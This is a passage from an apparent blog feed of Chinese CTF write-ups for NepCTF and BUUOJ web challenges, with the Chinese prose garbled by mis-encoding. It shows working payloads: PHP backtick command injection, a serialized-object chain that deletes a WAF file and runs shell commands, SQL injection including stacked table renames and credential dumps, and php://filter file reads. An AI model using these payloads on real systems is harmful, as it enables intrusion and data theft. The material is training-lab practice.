class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®—æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°trické¢˜å§ï¼Œæ‰¾äº†æ‰¾åº¦å¨˜çŸ¥é“å¯ä»¥åˆ©ç”¨<strong>phpçš„åå¼•å·æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong> çš„ç‰¹æ€§</p><h4 id="ç¬¬ä¸€ç§è§£æ³•"><a href="#ç¬¬ä¸€ç§è§£æ³•" class="headerlink" title="ç¬¬ä¸€ç§è§£æ³•"></a>ç¬¬ä¸€ç§è§£æ³•</h4><p>tipsï¼šè¿™ä¸ªè§£æ³•éœ€è¦å¼€ä¸¤æ¬¡é¶æœºï¼Œç¬¬ä¸€æ¬¡æŸ¥çœ‹æ–‡ä»¶ç›®å½•ï¼Œç¬¬äºŒæ¬¡cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?nep=`ls&gt;<span class="number">1</span>`&amp;len=<span class="number">7</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°</p><p><img src="https://i.loli.net/2021/03/23/hSQWDe2IVbiFzGH.png"></p><p>ç„¶åå†å¼€ä¸€æ¬¡é¶æœº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url/?nep=`&gt;cat`;&amp;len=<span class="number">7</span></span><br><span class="line">url/?nep=`*&gt;<span class="number">1</span>`;&amp;len=<span class="number">7</span></span><br><span class="line">åœ¨è¿™é‡Œ*&gt;<span class="number">1</span>ç›¸å½“äºcat index.php nepctf.php&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flag</p><blockquote><p>NepCTF{n3pn3p_l1ttle_tr1ck_c0me_bAck}</p></blockquote><h4 id="ç¬¬äºŒç§è§£æ³•"><a href="#ç¬¬äºŒç§è§£æ³•" class="headerlink" title="ç¬¬äºŒç§è§£æ³•"></a>ç¬¬äºŒç§è§£æ³•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || ls&gt;<span class="number">1</span></span><br><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || cat nepctf.php&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç”±äºintval()å‡½æ•°çš„ç‰¹æ€§ï¼Œä¼šåœ¨é‡åˆ°ç¬¬ä¸€ä¸ªéæ•°å­—å­—ç¬¦æ—¶åœæ­¢æˆªå–ï¼Œè€Œnepå‚æ•°ä¸­è¿ç”¨åå¼•å·``è°ƒç”¨lenå‚æ•°</p><p>ç”±äºlen=7 || cat nepctf.php&gt;1åœ¨linuxä¸­è¿è¡Œå¯çŸ¥7ä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œ||ï¼ˆæˆ–ï¼‰ä¹‹åçš„å¦ä¸€ä¸ªå‘½ä»¤</p><p>å³</p><p><img src="https://i.loli.net/2021/03/23/itKIN7fSxoB8Ub6.png"></p><h3 id="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h3><p>è¿›å…¥é¢˜ç›®åçœ‹è§ä¸€ä¸²ç‰¹é•¿çš„ä»£ç ï¼Œå…ˆæ¥ç®€å•å®¡è®¡ä¸€ä¸‹</p><p>é¦–å…ˆæ˜¯Gameç±»ï¼Œé‡Œé¢æœ‰<code>wakeup</code>å’Œ<code>destruct</code>æ–¹æ³•ï¼Œ<code>wakeup</code>é‡Œè¿˜æœ‰ä¸€ä¸ª<code>21232f297a57a5a743894a0e4a801fc3</code>åœ¨çº¿è§£ç åæ˜¯<code>admin</code></p><p>ç®€å•åˆ†æäº†ä¸€ä¸‹ï¼Œå’±å¯ä»¥çŸ¥é“åº”è¯¥æ˜¯è¦è°ƒç”¨Openç±»é‡Œçš„<code>shell($content);</code>æ¥è¿›è¡Œä»»æ„å‘½ä»¤çš„æ‰§è¡Œï¼Œä½†æ˜¯ç”±äº<code>waf.txt</code>çš„å­˜åœ¨ï¼Œå’±åªèƒ½è°ƒç”¨file_get_contents()</p><p>å…ˆçœ‹çœ‹shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>å‘ç°æŒºå¤šå‘½ä»¤ä¹Ÿè¢«banäº†</p><p><img src="https://i.loli.net/2021/03/23/RFHKUXqhJju12sN.png"></p><p>ä½†è¿™å…ˆæ”¾ä¸€è¾¹ï¼Œå…ˆçœ‹çœ‹æ€ä¹ˆåˆ é™¤æ‰<code>waf.txt</code>æ–‡ä»¶ï¼Œä¸ç„¶è¿å‘½ä»¤éƒ½è¾“ä¸è¿›å»_(:Ğ·ã€âˆ )_</p><p>ä¹‹å‰çš„ä»£ç å®¡è®¡å’±å¯ä»¥çŸ¥é“ï¼Œloginç±»ä¸­çš„checkingæ–¹æ³•é‡Œæœ‰ä¸ª<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);</code>è¿™è¡Œä»£ç </p><p>æ‰¾æ‰¾å¸¦æœ‰open()æ–¹æ³•ï¼Œè€Œä¸”è¿˜èƒ½åˆ é™¤æ–‡ä»¶çš„phpåŸç”Ÿç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        )))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span>.<span class="string">&quot;::&quot;</span>.<span class="variable">$method</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ZipArchive()åˆšå¥½å¯ä»¥æŠŠ<code>waf.txt</code>åˆ é™¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥éšæ„å‘½ä»¤æ‰§è¡Œè¾£</p><p>tipsï¼šå¾ˆå¤šæŸ¥çœ‹å‘½ä»¤è¢«banäº†ï¼Œä½†æ˜¯è¿˜å¯ä»¥ä½¿ç”¨<code>php /flag</code>ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>æ‰“å¼€é™„ä»¶çœ‹åˆ°ä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæ”¾åˆ°cyberchefé‡Œè½¬ä¸€è½¬</p><p><img src="https://i.loli.net/2021/03/23/utHhbQYmrPwe8JE.png"></p><p>æŠŠå‰©ä¸‹çš„å¤åˆ¶åˆ°sublime text</p><p><img src="https://i.loli.net/2021/03/23/oHuLIRyTnXF7MSa.png" alt="image-20210323171836395"></p><p>çœ‹èµ·æ¥æœ‰ç‚¹æ‰ï¼Œæ”¾åˆ°ç”»å›¾è½¯ä»¶é‡Œæ‹‰å®½ä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/03/23/Hnav8yB4hPeTJQV.png" alt="image-20210323171933445"></p><p>å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°flag</p><blockquote><p>Nep{Y0u_ar3_50_cl3ver!}</p></blockquote><h3 id="æˆ‘æ˜¯é—´è°2nd"><a href="#æˆ‘æ˜¯é—´è°2nd" class="headerlink" title="æˆ‘æ˜¯é—´è°2nd"></a>æˆ‘æ˜¯é—´è°2nd</h3><p>ä¸‹è½½çš„é™„ä»¶ç›´æ¥æ‰“å¼€æ˜¾ç¤ºå‡ºäº†ä¸€å¥è¯</p><p>**connecting to 223.223.223.223:6001 **</p><p>é‚£å’±å°±ä¿®æ”¹ä¸€ä¸‹ipä¸º223.223.223.223</p><p><img src="https://i.loli.net/2021/03/20/y8eCNGzUJhRFmVZ.png"></p><p>ç„¶åç”¨netcatå¼€ç›‘å¬ï¼Œå¹¶è¿è¡Œæ–‡ä»¶</p><blockquote><p>nc -lvvp 6001</p></blockquote><p>å‘ç°æœ‰å›å“</p><p><img src="https://i.loli.net/2021/03/20/I7VFOUe6XrJZoc4.png"></p><p>è¿æ¥å¯å¾—åˆ°flag</p><blockquote><p>Nep{XVlBzgbaiCMRAjWwhTHctcuAxhxKQFDaFpLSjFbcXoEF}</p></blockquote><h3 id="å‡ºé¢˜äººæ—¥è®°"><a href="#å‡ºé¢˜äººæ—¥è®°" class="headerlink" title="å‡ºé¢˜äººæ—¥è®°"></a>å‡ºé¢˜äººæ—¥è®°</h3><p>æ‰“å¼€é™„ä»¶åè§£å‹å‹ç¼©åŒ…å†…å®¹ï¼Œå‘ç°æ˜¯ä¸ª.xlsxæ–‡ä»¶ï¼Œæ‹¿010æ‰“å¼€åæŸ¥çœ‹æ–‡ä»¶å¤´å¯ä»¥çŸ¥é“å…¶å®æ˜¯ä¸€ä¸ª.zipå‹ç¼©æ–‡ä»¶</p><p>æ›´æ”¹æ–‡ä»¶æ‰©å±•ååè§£å‹ç¼©</p><p>tipsï¼šè¿™é‡Œæ‰“å¼€å‹ç¼©åŒ…çš„æ—¶å€™æ˜¯æœ‰ä¸€ä¸ªhintçš„ï¼Œä½†æ˜¯ä¸èƒ½æ‹¿é»˜è®¤çš„è§£å‹ç¼©è½¯ä»¶æ‰“å¼€ï¼Œä¸ç„¶çœ‹ä¸åˆ°å¤‡æ³¨</p><p><img src="https://i.loli.net/2021/03/24/xaPKZA3yI7kGT8v.png"></p><p>å‘ç°è¿™ä¸ªhintè¿˜è¢«ç¼–ç è¿‡äº†ï¼Œæ‹¿å»cyberchefè§£ç ä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/03/24/pyd5CD7FhtfI68u.png"></p><p>ç„¶åå»googleç›´æ¥æœç´¢Steganography.js</p><p><a href="https://www.peter-eigenschink.at/projects/steganographyjs/showcase/">https://www.peter-eigenschink.at/projects/steganographyjs/showcase/</a></p><p>ç„¶åç›´æ¥åœ¨ç‹ç« å†…è§£å¯†å°±å¯ä»¥å¾—åˆ°flagäº†</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://lucifer-rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ-Web-1pts</title>
    <link href="https://lucifer-rossweisse.github.io/2021/03/11/WriteUp/BUUOJ%20web%201pts/"/>
    <id>https://lucifer-rossweisse.github.io/2021/03/11/WriteUp/BUUOJ%20web%201pts/</id>
    <published>2021-03-11T14:05:23.000Z</published>
    <updated>2021-08-16T03:27:14.300Z</updated>
    
    <content type="html"><![CDATA[<p>BUUOJ-Web WriteUp</p><a id="more"></a><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>ç®€å•çš„sqlæ³¨å…¥</p><p>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç™»é™†è¿›å»ä¹‹åç›´æ¥çœ‹åˆ°flag</p><p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p><blockquote><p>flag{2c793226-369d-4941-af62-10463af21b6c}</p></blockquote><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>å°è¯•äº†å„ç§å§¿åŠ¿åå‘ç°å¯ä»¥ç”¨å †å æ³¨å…¥</p><p>çˆ†åº“å</p><blockquote><p>1â€™;show databases;#</p></blockquote><p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p><p>çˆ†è¡¨å</p><blockquote><p>1â€™;show tables;#</p></blockquote><p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p><p>çˆ†åˆ—å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #çˆ†1919810931114514è¡¨</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #çˆ†wordsè¡¨</span><br></pre></td></tr></table></figure><p>å‘ç°idåœ¨wordsè¡¨ä¸­ï¼Œé‚£ä¹ˆå’±åªéœ€è¦æ”¹ä¸ªè¡¨åå°±è¡Œäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # æŠŠè¡¨wordsæ›´åä¸ºwords1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # æŠŠè¡¨1919810931114514æ›´åä¸ºwords</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # æŠŠwordsä¸­çš„åˆ—åflagæ›´åä¸ºid</span><br></pre></td></tr></table></figure><p>ç„¶ååªè¦ç™»å…¥å°±å¯ä»¥çœ‹åˆ°flagäº†</p><blockquote><p>1â€™ or 1=1 #</p></blockquote><p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>æ‰“å¼€çœ‹è§ä¸€åªå¯çˆ±çš„å°çŒ«</p><p>ç›´æ¥è¿›å…¥ctrl + Uçœ‹æºä»£ç ï¼Œåœ¨ä¸‹é¢å‘ç°è—ä¸œè¥¿äº†</p><p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p><p>æŒ‰ç€GETä¸€ä¸ªcatå˜é‡ï¼Œå‡ºç°flag</p><p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p><blockquote><p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>ctrl+Uå‘ç°ä¸€ä¸ªArchive_room.php</p><p>ç”¨burpsuiteæŠ“ä¸€ä¸‹åŒ…ï¼Œå‘ç°ä¸€ä¸ªsecr3t.php</p><p><img src="https://i.loli.net/2021/03/13/2pXDMTH8ZsvziE4.png"></p><p>å‘ç°æ˜¯ä¸€æ®µç®€å•çš„ä»£ç å®¡è®¡å’Œæ–‡ä»¶åŒ…å«</p><p>å’±å¯ä»¥ç”¨ä¼ªåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/13/gCqDYKie7H3RVP2.png"></p><p>å¾—åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç å³å¯å¾—åˆ°flag</p><blockquote><p>flag{d67ab513-7a2d-4e45-a27a-99486f6f99ee}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>è¿›å»åå‘ç°æ˜¯ç®€å•çš„sqlæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1,2,3 # # æŸ¥çœ‹å›æ˜¾</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 # #çˆ†è¡¨å</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;),3 # # çˆ†åˆ—å</span><br><span class="line">-1&#39; union select 1,(select group_concat(concat_ws(0x7e, username, password)) from l0ve1ysq1),3 # #çˆ†æ•°æ®</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flag</p><blockquote><p>flag{94e175f4-807f-404e-a433-65501ae8595b}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>è¿™é¢˜æç¤ºå·²ç»POSTäº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p><p>ç›´æ¥ç”¨èšå‰‘è¿æ¥</p><p><img src="https://i.loli.net/2021/03/13/KYiDsjup9zoFG7b.png"></p><p>  å¾—åˆ°flag</p><blockquote><p>flag{46dce079-289a-4494-98da-139ce0e08a9a}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p> ctrl+Uå‘ç°ä¸€ä¸ªsecret.php</p><p>è¿›å…¥åä¾ç…§æç¤ºé€ä¸€æ·»åŠ header</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°flag</p><blockquote><p>flag{da768d87-8706-4596-bf42-71c1b8fa6453}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>æœ‰æç¤ºå¯ä»¥çŸ¥é“æœ‰ç½‘ç«™å¤‡ä»½æ–‡ä»¶</p><p>è¿ç”¨è„šæœ¬è¿›è¡Œæ‰«æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 